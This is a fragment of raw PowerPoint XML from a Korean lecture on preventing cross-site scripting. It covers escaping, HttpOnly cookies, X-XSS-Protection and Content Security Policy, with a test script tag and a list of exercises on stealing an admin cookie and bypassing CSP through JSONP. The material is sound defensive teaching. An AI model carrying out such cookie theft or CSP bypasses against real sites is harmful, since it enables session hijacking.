          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>때때로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 게시해야 하는 경우</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>한정된 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTML tag</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>허용해야함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9FA0ED-D2FC-4866-B7D2-645DBB16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230451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B90D0-0B8B-40A7-A2DA-B3A21DFA3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XSS using a template engine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42E209-4197-43AB-A277-22776B179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현대의 대부분 웹사이트는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>server-side template engine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에서 태그 이스케이프가 됨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요즘은 효과적으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 방지할 수 있음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Jinja,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>React</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 등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템플릿 엔진에서 제공하는 기능들을 잘 사용해야함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391F34-663B-4C8B-A951-23FC59EC8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49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09795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82C314-FFE5-4C77-9B94-716041DBE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59485" y="634946"/>
            <a:ext cx="3690257" cy="1450757"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3700" dirty="0"/>
              <a:t>How to prevent XSS in PHP</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="3700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E33C3B9F-195A-4F81-8173-05A02B8A8C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852" y="640081"/>
            <a:ext cx="5670095" cy="53144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A7FD08D-2A2E-4A12-A2F9-CDA06CAF7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9485" y="2198914"/>
            <a:ext cx="3690257" cy="3670180"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0"/>
              <a:t>php </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1900" dirty="0"/>
              <a:t>에서는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" b="1" dirty="0" err="1"/>
              <a:t>htmlentities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1900" dirty="0"/>
              <a:t>라고 하는 인코딩 기능이 있음</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1900" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" altLang="ko-KR" sz="1900" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>&lt;?php echo htmlentities($input, ENT_QUOTES, 'UTF-8');?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1900" b="0" i="0" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Courier"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0">
              <a:latin typeface="Courier"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0" err="1"/>
              <a:t>Javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1900" dirty="0"/>
              <a:t> 에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0" err="1"/>
              <a:t>Unocode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0"/>
              <a:t>-escape </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1900" dirty="0"/>
              <a:t>하는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0"/>
              <a:t>API</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1900" dirty="0"/>
              <a:t>는 제공하지 않으므로 몇 가지 코드를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>적용해야함</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1900" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="19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259800-296B-4629-A29C-A4C301FE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3C588AB-8E84-4C01-BDFA-16202E2AEB06}" type="slidenum">
              <a:rPr lang="ko-KR" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr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76023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231BE-A0B8-4BC8-8665-A47C54F7D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XSS client-side in JavaScript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2D3F45-CAAA-4039-85BF-24FDCD799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다음은 문자열을 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTML entities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>로 변환하는 예시 코드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AA5E73-056B-47D6-BAFC-7D505C39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51</a:t>
            </a:fld>
            <a:endParaRPr lang="ko-KR" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="그림 5" descr="텍스트이(가) 표시된 사진&#10;&#10;자동 생성된 설명">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{312FE5F7-8A92-456F-BF55-8E14BFE81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1728" y="2416443"/>
            <a:ext cx="6287377" cy="15051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534C627-3414-4862-8413-DFECE40CC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764" y="4154875"/>
            <a:ext cx="7935432" cy="3620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0058348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231BE-A0B8-4BC8-8665-A47C54F7D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XSS client-side in JavaScript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2D3F45-CAAA-4039-85BF-24FDCD799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입력한 내용이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문자열 안에 있는 경우</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, Unicode-escape</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 수행해야함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AA5E73-056B-47D6-BAFC-7D505C39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52</a:t>
            </a:fld>
            <a:endParaRPr lang="ko-KR" altLang="en-US" dirty="0"/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01B5F4BA-13CD-48C8-97BF-389EC84898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231" y="2633551"/>
            <a:ext cx="7611537" cy="15908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19617D5-11CB-414B-AE7B-94921F4819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2159" y="4605652"/>
            <a:ext cx="7468642" cy="60015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707899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CC9C8-5BE0-4381-A89B-46125BFB9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7BC1CE-6767-45C5-88A8-735CC9B12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HTTPOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>플래그 사용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Set-Cookie: session=dfe3sdf212jdf; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTTP response header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Set-Cookie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>헤더를 전송해 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>자바스크립트에서 해당 쿠키 접근 하는 것을 금지</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>취약점이 발생하더라도 공격자는 쿠키 값을 알아낼 수 없음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C4D9C7-F2CF-4998-B80C-0051CA40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837132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CC9C8-5BE0-4381-A89B-46125BFB9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7BC1CE-6767-45C5-88A8-735CC9B12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X-XSS-Protection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTTP Response Header </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 선언하여 사용할 수 있음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X-XSS-Protection: &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>값</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&gt;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웹 브라우저에 내장된 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS Filter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 사용할 것인지 판단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XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격 방식을 발견하고 차단함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Request </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>값과 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 비교해 판단하여 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Reflected XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격을 막는 데에는 적합하지만</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>다른 유형 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격을 막을 수 없음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C4D9C7-F2CF-4998-B80C-0051CA40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35850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DCC9C8-5BE0-4381-A89B-46125BFB9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7BC1CE-6767-45C5-88A8-735CC9B127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X-XSS-Protection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>X-XSS-Protection: 0 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>사용하지 않음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X-XSS-Protection: 1 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>탐지된 부분만 제거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X-XSS-Protection: 1; mode=block (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>페이지 렌더링을 중단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X-XSS-Protection: 1; report=&lt;reporting-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>uri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&gt; (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>운영자가 대처하도록 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>report)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Header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 선언하지 않았으면 기본 값은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>최근에는 사용하지 않는 추세 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>와 같은 현대적인 표준이 이유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>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>XSS protection disappe ars from Microsoft Edge | The Daily Swig (portswigger.net)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C4D9C7-F2CF-4998-B80C-0051CA40E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99701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6BBA0F-7209-4AC9-BC44-46014047F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to prevent XSS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10B348-4429-4C65-9044-C0C4DEF37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Content Security Policy (CSP)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1CBAC35-5BF6-4481-AF3E-5BB2EB38A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885268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26804-E884-4C03-BA4F-4C000CA5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 Security Policy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37102F-3499-4418-BDCA-A09680E22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XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>및 기타 공격을 막을 수 있는 브라우저 보안 메커니즘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지시어를 통해서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>사이트에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0" err="1"/>
              <a:t>로드하는</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t> 리소스</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t> 이미지 등</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0"/>
              <a:t>의 출처를 제한하는 정책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en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Response Header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>나 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>meta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>태그를 통해 선언해서 사용할 수 있음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E25065-F1AF-4BEC-8025-CF4D9F27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19125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26804-E884-4C03-BA4F-4C000CA5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 Security Policy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37102F-3499-4418-BDCA-A09680E22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Mitigating XSS attacks using CSP</a:t>
            </a:r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현재 페이지와 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>same origin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에서만 스크립트를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>로드할</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 수 있도록 허용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ko-KR" altLang="en-US" dirty="0"/>
              <a:t>특정 도메인에서만 스크립트를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>로드할</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 수 있도록 허용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E25065-F1AF-4BEC-8025-CF4D9F27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58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ECCFBD2-7076-4A8C-9385-00EB39B1DDD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83"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1509290" y="2913529"/>
            <a:ext cx="3141458" cy="51547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9D1A6C3-264C-4872-941C-A3752C76A3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9290" y="4280986"/>
            <a:ext cx="7714229" cy="44203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126657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026804-E884-4C03-BA4F-4C000CA5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 Security Policy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37102F-3499-4418-BDCA-A09680E224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b="1" dirty="0"/>
              <a:t>Mitigating XSS attacks using CSP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>는 특정 도메인을 추가할 뿐 아니라 신뢰할 수 있는 리소스를 지정하는 두 가지 다른 방법을 제공함</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.</a:t>
            </a:r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nonce</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>Content-Security-Policy: default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t> 'nonce-1AfdcQ8/gY+d1Yarc7=='; base-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0" err="1"/>
              <a:t>uri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t> 'none’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>nonce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>속성이 입력된 태그만을 허용한다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nonce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>값은 공격자가 예측할 수 없도록 페이지를 접근할 때마다 재생성해야 함</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;script nonce="{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>고정된 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>nonce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>값</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>}"&gt;alert(1);&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="201168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Hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>Content-Security-Policy: script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t> 'sha384-OLBgp1GsljhM2TJ+sbHjaiH9txEUvgdDTAzHv2P24donTt6/529l+9Ua0vFImLlb3g==‘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>스크립트의 내용에 대한 해시를 지정</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>지정된 값과 일치하지 않으면 스크립트를 실행시키지 않음</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="ko-KR" altLang="en-US" b="1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E25065-F1AF-4BEC-8025-CF4D9F272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59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116310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43D9F7-1014-4686-A983-4613146AA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Content Security Policy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B5CD2D-46EE-4A33-A3E6-E87C22EF0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CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 한번 확인해보고 넘어갑시다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https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass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BDECEB-9548-47D9-B5E2-F933F711B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666032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15806C-2480-455D-B747-202D0141D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CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>지시문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1578F193-4D3F-498A-B638-E48E3703D3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63236" y="2233391"/>
            <a:ext cx="7725853" cy="3172268"/>
          </a:xfr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A54F55-8A7D-4935-8714-839A87371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06011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8962B-AFE5-40C3-96DC-6EE567BD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CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>지시문</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="내용 개체 틀 5" descr="텍스트이(가) 표시된 사진&#10;&#10;자동 생성된 설명">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF649011-DBC1-4CFA-AC3B-97A87037D3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094" y="2785146"/>
            <a:ext cx="7161812" cy="2063370"/>
          </a:xfrm>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln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896CAB-7904-4758-B2F6-497A6F20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245428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0C6A2B-5A83-4675-984B-735AA197F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CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 참고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33C2C6-6223-4E59-95AC-D5078D2DC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https://simjaejin.tistory.com/31</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://developers.google.com/web/fundamentals/security/csp/?hl=ko</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/cross-site-scripting/content-security-policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://www.hahwul.com/2019/01/27/csp-bypass-technique-xss/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C80160B-2D2A-434A-AFEF-4E5E0F774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772676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B921F7-AC0E-4076-B33F-253833FBC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QnA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70AF8D-523A-414F-8947-0DB0889BD1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lhm1024@korea.ac.kr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FF4F4A-187C-4A91-B978-925A8F48D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995642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2586F1-3536-456A-8B32-CB082CB0C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AC5EE4-6AEF-4A6E-949E-3131E93332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en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>DomDom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> Dance </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>풀이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>- XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 이용해 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 쿠키 탈취</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>pwnhyo.kr:30002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2. CSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문제 풀이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>- CSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>지시어에 대하여 공부</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://dreamhack.io/wargame/challenges/36/</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>3. webhacking.kr CHILD </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>풀이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>- Bypassing CSP by Abusing JSONP Endpoints</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://medium.com/@mazin.ahmed/bypassing-csp-by-abusing-jsonp-endpoints-47cf453624d5</a:t>
